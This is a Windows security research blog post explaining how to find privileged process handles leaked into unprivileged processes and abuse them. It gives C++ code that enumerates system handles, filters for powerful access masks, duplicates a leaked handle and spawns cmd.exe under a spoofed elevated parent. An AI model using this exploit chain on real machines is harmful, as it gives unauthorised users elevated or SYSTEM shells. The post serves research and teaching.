---
layout: post
title: 🇬🇧 Gaining the upper hand(le)	
subtitle: Hunting for privilege escalations and UAC bypasses by looking for leaked handles in unprivileged processes
image: /img/tortellindows.png
published: true
author:
- last
---
[![tortellino windows](/img/tortellindows.png)](/img/tortellindows.png)

### TL;DR
There are some situations where processes with high or SYSTEM integrity request handles to privileged processes/threads/tokens and then spawn lower integrity processes. If these handles are sufficiently powerful, of the right type and are inherited by the child process, we can clone them from another process and then abuse them to escalate privileges and/or bypass UAC. In this post we will learn how to look for and abuse this kind of vulnerability.

### Introduction
Hello there, hackers in arms, [last](https://twitter.com/last0x00) here! Lately I've been hunting a certain type of vulnerability which can lead to privilege escalations or UAC bypasses. Since I don't think it has been thoroughly explained yet, let alone automatized, why don’t we embark on this new adventure?  

Essentially, the idea is to see if we can find unprivileged processes which have privileged handles to high integrity (aka elevated) or SYSTEM processes, and then check if we can attach to these processes as an unprivileged user and clone these handles to later abuse them. What constraints will be placed on our tool?
1. It must run as a medium integrity process
2. No SeDebugPrivilege in the process' token (no medium integrity process has that by default)
3. No UAC bypass as it must also work for non-administrative users

This process is somewhat convoluted, the steps we will go through are more or less the following ones:
1. Enumerate all handles held by all the processes
2. Filter out the handles we don’t find interesting - for now we will only focus on handles to processes, threads and tokens, as they are the ones more easily weaponizable
3. Filter out the handles referencing low integrity processes/threads/tokens
4. Filter out the handles held by process with integrity greater than medium - we can’t attach to them unless we got SeDebugPrivilege, which defeats the purpose of this article
5. Clone the remaining handles and import them into our process and try to abuse them to escalate privileges (or at least bypass UAC)

[![ven diagram](/img/handlesven.jpg)](/img/handlesven.jpg)

Granted, it’s pretty unlikely we will be finding a ton of these on a pristine Windows machine, so to get around that I will be using a vulnerable application I written specifically for this purpose, though you never know what funny stuff administrators end up installing on their boxes...

Now that we have a rough idea of what we are going to do, let’s cover the basics.

#### Handles 101
As I briefly discussed in [this Twitter thread](https://twitter.com/last0x00/status/1355910168706428940), Windows is an object based OS, which means that every entity (be it a process, a thread, a mutex, etc.) has an "object" representation in the kernel in the form of a data structure. For processes, for example, this data structure is of type [_EPROCESS](https://www.vergiliusproject.com/kernels/x64/Windows%2011/21H2%20(RTM)/_EPROCESS). Being data living in kernelspace, there's no way for normal, usermode code to interact directly with these data structures, so the OS exposes an indirection mechanism which relies on special variables of type `HANDLE` (and derived types like `SC_HANDLE` for services). A handle is nothing more than a index in a kernelspace table, private for each process. Each entry of the table contains the address of the object it points to and the level of access said handle has to said object. This table is pointed to by the `ObjectTable` member (which is of type `_HANDLE_TABLE*`, hence it points to a [`_HANDLE_TABLE`](https://www.vergiliusproject.com/kernels/x64/Windows%2011/21H2%20(RTM)/_HANDLE_TABLE)) of the `_EPROCESS` structure of every process.

To make it easier to digest, let's see an example. To get a handle to a process we can use the [`OpenProcess`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) Win32 API - here's the definition:

```c++
HANDLE OpenProcess(
  DWORD dwDesiredAccess,
  BOOL  bInheritHandle,
  DWORD dwProcessId
);
```

It takes 3 parameters:
- `dwDesiredAccess` is a `DWORD` which specifies the level of access we want to have on the process we are trying to open
- `bInheritHandle` is a boolean which, if set to `TRUE`, will make the handle inheritable, meaning the calling process copies the returned handle to child processes when they are spawned (in case our program ever calls functions like `CreateProcess`)
- `dwProcessId` is a `DWORD` which is used to specify which process we want to open (by providing its PID)

In the following line I will try to open a handle to the System process (which always has PID 4), specifying to the kernel that I want the handle to have the least amount of privilege possible, required to query only a subset of information regarding the process (`PROCESS_QUERY_LIMITED_INFORMATION`) and that I want child processes of this program to inherit the returned handle (`TRUE`).

```c++
HANDLE hProcess;
hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, 4);
```

The handle to the System process returned by `OpenProcess` (provided it doesn't fail for some reason) is put into the `hProcess` variable for later use.

Behind the scenes, the kernel does some security checks and, if these checks pass, takes the provided PID, resolves the address of the associated `_EPROCESS` structure and copies it into a new entry into the handle table. After that it copies the access mask (i.e. the provided access level) into the same entry and returns the entry value to the calling code.

Similar things happen when you call other functions such as `OpenThread` and `OpenToken`.   

#### Viewing handles
As we introduced before, handles are essentially indexes of a table. Each entry contains, among other things, the address of the object the handle refers to and the access level of the handle. We can view this information using tools such as Process Explorer or Process Hacker:

[![handles 1](/img/handles1.png)](/img/handles1.png)

From this Process Explorer screenshot we can gain a few information:
- Red box: the type of object the handle refers to;
- Blue box: the handle value (the actual index of the table entry);
- Yellow box: the address of the object the handle refers to;
- Green box: the access mask and its decoded value (access masks are macros defined in the `Windows.h` header). This tells us what privileges are granted on the object to the holder of the handle;

To obtain this information there are many methods, not necessarily involving the use of code running in kernelmode. Among these methods, the most practical and useful is relying on the native API `NtQuerySystemInformation`, which, when called passing the `SystemHandleInformation` (0x10) value as its first parameter, returns us a pointer to an array of `SYSTEM_HANDLE` variables where each of them refers to a handle opened by a process on the system.

```c++
NTSTATUS NtQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID                    SystemInformation,
	ULONG                    SystemInformationLength,
	PULONG                   ReturnLength
);
```

Let's have a look at a possible way to do it using C++.

```c++
NTSTATUS queryInfoStatus = 0;
PSYSTEM_HANDLE_INFORMATION tempHandleInfo = nullptr;
size_t handleInfoSize = 0x10000;
auto handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
if (handleInfo == NULL) return mSysHandlePid;
while (queryInfoStatus = NtQuerySystemInformation(
	SystemHandleInformation, //0x10
	handleInfo,
	static_cast<ULONG>(handleInfoSize),
	NULL
) == STATUS_INFO_LENGTH_MISMATCH)
{
	tempHandleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(handleInfo, handleInfoSize *= 2);
	if (tempHandleInfo == NULL) return mSysHandlePid;
	else handleInfo = tempHandleInfo;
}
```

In this block of code we are working with the following variables:
1. `queryInfoStatus` which will hold the return value of `NtQuerySystemInformation`
2. `tempHandleInfo` which will hold the data regarding all the handles on the system `NtQuerySystemInformation` fetches for us
3. `handleInfoSize` which is a "guess" of how much said data will be big - don't worry about that as this variable will be doubled every time `NtQuerySystemInformation` will return `STATUS_INFO_LENGTH_MISMATCH` which is a value telling us the allocated space is not enough
4. `handleInfo` which is a pointer to the memory location `NtQuerySystemInformation` will fill with the data we need  

Don't get confused by the `while` loop here, as we said, we are just calling the function over and over until the allocated memory space is big enough to hold all the data. This type of operation is fairly common when working with the Windows native API.

The data fetched by `NtQuerySystemInformation` can then be parsed simply by iterating over it, like in the following example:
```c++
for (uint32_t i = 0; i < handleInfo->HandleCount; i++) 
{
	auto handle = handleInfo->Handles[i];
	std::cout << "[*] PID: " << handle.ProcessId << "\n\t"
		  << "|_ Handle value: 0x" << std::hex << static_cast<uint64_t>(handle.Handle) << "\n\t"
                  << "|_ Object address: 0x" << std::hex << reinterpret_cast<uint64_t>(handle.Object) << "\n\t"
                  << "|_ Object type: 0x" << std::hex << static_cast<uint32_t>(handle.ObjectTypeNumber) << "\n\t"
                  << "|_ Access granted: 0x" << std::hex << static_cast<uint32_t>(handle.GrantedAccess) << std::endl;  
}
```
  
As you can see from the code, the variable `handle` which is a structure of type `SYSTEM_HANDLE` (`auto`'d out of the code) has a number of members that give useful information regarding the handle it refers to. The most interesting members are:
- `ProcessId`: the process which holds the handle
- `Handle`: the handle value inside the process that holds the handle itself
- `Object`: the address in kernelspace of the object the handle points to
- `ObjectTypeNumber`: an undocumented `BYTE` variable which identifies the type of object the handle refers to. To interpret it some reverse engineering and digging is required, suffice it to say that processes are identified by the value `0x07`, threads by `0x08` and tokens by `0x05`
- `GrantedAccess` the level of access to the kernel object the handle grants. In case of processes, you can find values such as `PROCESS_ALL_ACCESS`, `PROCESS_CREATE_PROCESS` etc.

Let's run the aforementioned code and see its output:

[![listing handles with c++](/img/handles2.png)](/img/handles2.png)

In this excerpt we are seeing 3 handles that process with PID 4 (which is the System process on any Windows machine) has currently open. All of these handles refer to kernel objects of type process (as we can deduce from the `0x7` value of the object type), each with its own kernelspace address, but only the first one is a privileged handle, as you can deduce from its value, `0x1fffff`, which is what `PROCESS_ALL_ACCESS` translates to. Unluckily, in my research I have found no straightforward way to directly extract the PID of the process pointed to by the `ObjectAddress` member of the `SYSTEM_HANDLE` struct. We will see later a clever trick to circumvent this problem, but for now let's check which process it is using Process Explorer.

[![seeing the process with procexp](/img/handles3.png)](/img/handles3.png)

As you can see, the handle with value `0x828` is of type process and refers to the process `services.exe`. Both the object address and granted access check out as well and if you look to the right of the image you will see that the decoded access mask shows `PROCESS_ALL_ACCESS`, as expected.

This is very interesting as it essentially allows us to peer into the handle table of any process, regardless of its security context and PP(L) level. 

### Let's go hunting  
#### Getting back the PID of the target process from its object address
As I pointed out before, in my research I did not find a way to get back the PID of a process given a `SYSTEM_HANDLE` to the process, but I did find an interesting workaround. Let's walk through some assumptions first:
- The `SYSTEM_HANDLE` structure contains the `Object` member, which holds the kernel object address, which is in kernelspace
- On Windows, all processes have their own address space, but the kernelspace part of the address space (the upper 128TB for 64 bit processes) is the same for all processes. Addresses in kernelspace hold the same data in all processes
- When it comes to handles referring to processes, the `Object` member of `SYSTEM_HANDLE` points to the `_EPROCESS` structure of the process itself
- Every process has only one `_EPROCESS` structure
- We can obtain a handle to any process, regardless of its security context, by calling `OpenProcess` and specifying `PROCESS_QUERY_LIMITED_INFORMATION` as the desired access value
- When calling `NtQuerySystemInformation` we can enumerate all of the opened handles

From these assumptions we can deduce the following information:
- The `Object` member of two different `SYSTEM_HANDLE` structures will be the same if the handle is opened on the same object, regardless of the process holding the handle (e.g. two handles opened on the same file by two different processes will have the same `Object` value)
	- Two handles to the same process opened by two different processes will have a matching `Object` value
	- Same goes for threads, tokens etc.
- When calling `NtQuerySystemInformation` we can enumerate handles held by our own process
- If we get a handle to a process through `OpenProcess` we know the PID of said process, and, through `NtQuerySystemInformation`, its `_EPROCESS`'s kernelspace address

Can you see where we are going? If we manage to open a handle with access `PROCESS_QUERY_LIMITED_INFORMATION` to all of the processes and later retrieve all of the system handles through 	`NtQuerySystemInformation` we can then filter out all the handles not belonging to our process and extract from those that do belong to our process the `Object` value and get a match between it and the resulting PID. Of course the same can be done with threads, only using `OpenThread` and `THREAD_QUERY_INFORMATION_LIMITED`.

To efficiently open all of the processes and threads on the system we can rely on the routines of the `TlHelp32.h` library, which essentially allow us to take a snapshot of all the processes and threads on a system and walk through that snapshot to get the PIDs and TIDs (Thread ID) of the processes and threads running when the snapshot was taken.

The following block of code shows how we can get said snapshot and walk through it to get the PIDs of all the processes.

```c++
std::map<HANDLE, DWORD> mHandleId;

wil::unique_handle snapshot(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
PROCESSENTRY32W processEntry = { 0 };
processEntry.dwSize = sizeof(PROCESSENTRY32W);

// start enumerating from the first process
auto status = Process32FirstW(snapshot.get(), &processEntry); 

// start iterating through the PID space and try to open existing processes and map their PIDs to the returned shHandle
std::cout << "[*] Iterating through all the PID/TID space to match local handles with PIDs/TIDs...\n";
do
{
	auto hTempHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processEntry.th32ProcessID);
	if (hTempHandle != NULL)
	{
		// if we manage to open a shHandle to the process, insert it into the HANDLE - PID map at its PIDth index
		mHandleId.insert({ hTempHandle, processEntry.th32ProcessID });
	}
} while (Process32NextW(snapshot.get(), &processEntry));
```
We first define a `std::map` which is a dictionary-like class in C++ that will allow us to keep track of which handles refer to which PID. We will call it `mHandleId`. 

Done that we take a snapshot of the state of the system regarding processes using  the `CreateToolhelp32Snapshot` and specifying we only want processes (through the `TH32CS_SNAPPROCESS` argument). This snapshot is assigned to the `snapshot` variable, which is of type `wil::unique_handle`, a C++ class of the WIL library which frees us of the burden of having to take care of properly cleaning handles once they are used. Done that we define and initialize a `PROCESSENTRY32W` variable called `processEntry` which will hold the information of the process we are examining once we start iterating through the snapshot.

After doing so we call `Process32FirstW` and fill `processEntry` with the data of the first process in the snapshot. For each process we try to call `OpenProcess`  with `PROCESS_QUERY_LIMITED_INFORMATION` on its PID and, if successful, we store the handle - PID pair inside  the `mHandleId` map.

On each `while` cycle we execute `Process32NextW` and fill the `processEntry` variable with a new process, until it returns false and we get out of the loop. We now have a 1 to 1 map between our handles and the PID of the processes they point to. Onto phase 2!

It's now time to get all of system's handles and filter out the ones not belonging to our process. We already saw how to retrieve all the handles, now it's just a matter of checking each `SYSTEM_HANDLE` and comparing its `ProcessId` member with the PID of our process, obtainable through the aptly named `GetCurrentProcessId` function. We then store the `Object` and `Handle` members' value of those `SYSTEM_HANDLE`s that belong to our process in a similar manner as we did we the handle - PID pairs, using a map we will call `mAddressHandle`.

```c++
std::map<uint64_t, HANDLE> mAddressHandle;
for (uint32_t i = 0; i < handleInfo->HandleCount; i++) 
{
    auto handle = handleInfo->Handles[i];

    // skip handles not belonging to this process
    if (handle.ProcessId != pid)
        continue;
    else
    {
        // switch on the type of object the handle refers to
        switch (handle.ObjectTypeNumber)
        {
        case OB_TYPE_INDEX_PROCESS:
        {
            mAddressHandle.insert({ (uint64_t)handle.Object, (HANDLE)handle.Handle }); // fill the ADDRESS - HANDLE map 
            break;
        }

        default:
            continue;
        }
    }
}
```

You might be wondering why the `switch` statement instead of a simple `if`. Some code has been edited out as these are excerpt of a tool we [Advanced Persistent Tortellini](https://twitter.com/aptortellini) coded specifically to hunt for the vulnerabilities we mentioned at the beginning of the post. We plan on open sourcing it when we feel it's ready for public ~~shame~~ use.

Now that we have filled our two maps, getting back the PID of a process when we only know it's `_EPROCESS` address is a breeze. 

```c++
auto address = (uint64_t)(handle.Object);
auto foundHandlePair = mAddressHandle.find(address);
auto foundHandle = foundHandlePair->second;
auto handlePidPair = mHandleId.find(foundHandle);
auto handlePid = handlePidPair->second;
```

We first save the address of the object in the `address` variable, then look for that address in the `mAddressHandle` map by using the `find` method, which will return a `<uint64_t,HANDLE>` pair. This pair contains the address and the handle it corresponds to. We get the handle by saving the value of the `second` member of the pair and save it in the `foundHandle` variable. After that, it's just a matter of doing what we just did, but with the `mHandleId` map and the `handlePid` variable will hold the PID of the process whose address is the one we began with.

#### Automagically looking for the needle in the haystack
Now that we have a reliable way to match addresses and PIDs, we need to specifically look for those situations where processes with integrity less than high hold interesting handles to processes with integrity equal or greater than high. But what makes a handle "interesting" from a security perspective? [Bryan Alexander](https://twitter.com/dronesec) lays it down pretty clearly in [this blogpost](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/), but essentially, when it comes to processes, the handles we will focus on are the ones with the following access mask:
- `PROCESS_ALL_ACCESS`
- `PROCESS_CREATE_PROCESS`
- `PROCESS_CREATE_THREAD`
- `PROCESS_DUP_HANDLE`
- `PROCESS_VM_WRITE`

If you find a handle to a privileged process with at least one of this access masks in an unprivileged process, it's jackpot. Let's see how we can do it.

```c++
std::vector<SYSTEM_HANDLE> vSysHandle;
for (uint32_t i = 0; i < handleInfo->HandleCount; i++) {
    auto sysHandle = handleInfo->Handles[i];
    auto currentPid = sysHandle.ProcessId;
    if (currentPid == pid) continue; // skip our process' handles
    auto integrityLevel = GetTargetIntegrityLevel(currentPid);

    if (
        integrityLevel != 0 &&
        integrityLevel < SECURITY_MANDATORY_HIGH_RID && // the integrity level of the process must be < High
        sysHandle.ObjectTypeNumber == OB_TYPE_INDEX_PROCESS
	)        
    {
        if (!(sysHandle.GrantedAccess == PROCESS_ALL_ACCESS || 
        	sysHandle.GrantedAccess & PROCESS_CREATE_PROCESS || 
        	sysHandle.GrantedAccess & PROCESS_CREATE_THREAD || 
        	sysHandle.GrantedAccess & PROCESS_DUP_HANDLE || 
        	sysHandle.GrantedAccess & PROCESS_VM_WRITE)) continue;
        
        auto address = (uint64_t)(sysHandle.Object);
        auto foundHandlePair = mAddressHandle.find(address);
        if (foundHandlePair == mAddressHandle.end()) continue;
        auto foundHandle = foundHandlePair->second;
        auto handlePidPair = mHandleId.find(foundHandle);
        auto handlePid = handlePidPair->second;
        auto handleIntegrityLevel = GetTargetIntegrityLevel(handlePid);
        if (
            handleIntegrityLevel != 0 &&
            handleIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID // the integrity level of the target must be >= High
            )
        {
            vSysHandle.push_back(sysHandle); // save the interesting SYSTEM_HANDLE
        }
    }  
}
```
  
In this block of code we start out by defining a `std::vector` called `vSysHandle` which will hold the interesting `SYSTEM_HANDLE`s. After that we start the usual iteration of the data returned by `NtQuerySystemInformation`, only this time we skip the handles held by our current process. We then check the integrity level of the process which holds the handle we are currently analyzing through the helper function  I wrote called `GetTargetIntegrityLevel`. This function basically returns a `DWORD` telling us the integrity level of the token associated with the PID it receives as argument and is adapted from a number of PoCs and MSDN functions available online. 

Once we've retrieved the integrity level of the process we make sure it's less than high integrity, because we are interested in medium or low integrity processes holding interesting handles and we also make sure the `SYSTEM_HANDLE` we are working with is of type process (`0x7`). Checked that, we move to checking the access the handle grants. If the handle is not `PROCESS_ALL_ACCESS` or doesn't hold any of the flags specified, we skip it. Else, we move further, retrieve the PID of the process the handle refers to, and get its integrity level. If it's high integrity or even higher (e.g. SYSTEM) we save the `SYSTEM_HANDLE` in question inside our `vSysHandle` for later (ab)use. 

This, kids, is how you automate leaked privileged handle hunting. Now that we have a vector holding all these interesting handles it's time for the exploit!

### Gaining the upper hand(le)!
We have scanned the haystack and separated the needles from the hay, now what? Well, again [dronesec's blogpost](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/) details what you can do with each different access, but let's focus on the more common and easy to exploit: `PROCESS_ALL_ACCESS`.

First off, we start by opening the process which holds the privileged handle and subsequently clone said handle.

```c++
DWORD ownerPid = SysHandle.ProcessId;
HANDLE elevatedToken = NULL;
auto hOwner = OpenProcess(PROCESS_DUP_HANDLE, false, ownerPid);
HANDLE clonedHandle;
auto success = DuplicateHandle(hOwner, (HANDLE)sysHandle.Handle, GetCurrentProcess(), &clonedHandle, NULL, false, DUPLICATE_SAME_ACCESS);
```
This is fairly easy and if you skip error control, which you shouldn't skip (right, [h0nus](https://twitter.com/h0nus)?), it boils down to only a handful of code lines. First you open the process with `PROCESS_DUP_HANDLE` access, which is the least amount of privilege required to duplicate a handle, and then call `DuplicateHandle` on that process, telling the function you want to clone the handle saved in `sysHandle.Handle` (which is the interesting handle we retrieved before) and save it into the current process in the `clonedHandle` variable.

In this way our process is now in control of the privileged handle and we can use it to spawn a new process, spoofing its parent as the privileged process the handle points to, thus making the new process inherit its security context and getting, for example, a command shell.
```c++
STARTUPINFOEXW sinfo = { sizeof(sinfo) };
PROCESS_INFORMATION pinfo;
LPPROC_THREAD_ATTRIBUTE_LIST ptList = NULL;
SIZE_T bytes = 0;
sinfo.StartupInfo.cb = sizeof(STARTUPINFOEXA);
InitializeProcThreadAttributeList(NULL, 1, 0, &bytes);
ptList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(bytes);
InitializeProcThreadAttributeList(ptList, 1, 0, &bytes);
UpdateProcThreadAttribute(ptList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &clonedHandle, sizeof(HANDLE), NULL, NULL);
sinfo.lpAttributeList = ptList;
std::wstring commandline = L"C:\\Windows\\System32\\cmd.exe";

auto success = CreateProcessW(
	nullptr,
	&commandline[0],
	NULL,
	NULL,
	true,
	EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
	NULL,
	NULL,
	&sinfo.StartupInfo,
	&pinfo);
CloseHandle(pinfo.hProcess);
CloseHandle(pinfo.hThread);
```

Let's see it in action 😊

[![poc gif](/img/handles5.gif)](/img/handles5.gif)

Some notes:
- Dronesec used `NtQueryObject` to find the process name associated with the kernel object. I don't find it feasible for a large number of handles as calling this would slow down a lot the process of matching addresses with handles
- I voluntarily left out the thread and token implementation of the exploit to the reader as an exercise 😉

We are planning on releasing this tool, UpperHandler, as soon as we see fit. Stay tuned, last out!

## References
- [https://rayanfam.com/topics/reversing-windows-internals-part1/](https://rayanfam.com/topics/reversing-windows-internals-part1/)
- [https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/leaked-handle-exploitation](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/leaked-handle-exploitation)
- [http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)
